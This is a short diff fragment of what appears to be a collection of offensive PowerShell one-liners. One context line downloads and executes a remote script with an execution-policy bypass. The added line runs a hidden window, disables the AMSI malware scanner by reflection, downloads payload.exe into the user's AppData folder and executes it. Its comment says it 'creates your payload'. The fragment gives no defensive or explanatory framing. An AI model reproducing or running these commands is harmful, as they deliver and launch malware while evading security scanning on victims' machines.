@@ -4,3 +4,5 @@ powershell -WindowStyle Hidden $wscript = new-object -ComObject WScript.Shell;$w
 
 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Exec Bypass -NoP -NoExit -Command iex((New-Object System.Net.WebClient).DownloadString('http://example.com/payload.exe'))
 
+powershell.exe -WindowStyle Hidden -noprofile [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);If (test-path  $env:APPDATA + '\payload.exe') {Remove-Item  $env:APPDATA + '\payload.exe'}; $OEKQD = New-Object System.Net.WebClient; $OEKQD.Headers['User-Agent'] = 'USR-KL'; $OEKQD.DownloadFile('https://example.com/payload.exe', $env:APPDATA + '\payload.exe'); (New-Object -com Shell.Application).ShellExecute($env:APPDATA + '\payload.exe'); Stop-Process -Id $Pid -Force  // Creates your payload in user's "AppData" directory
+
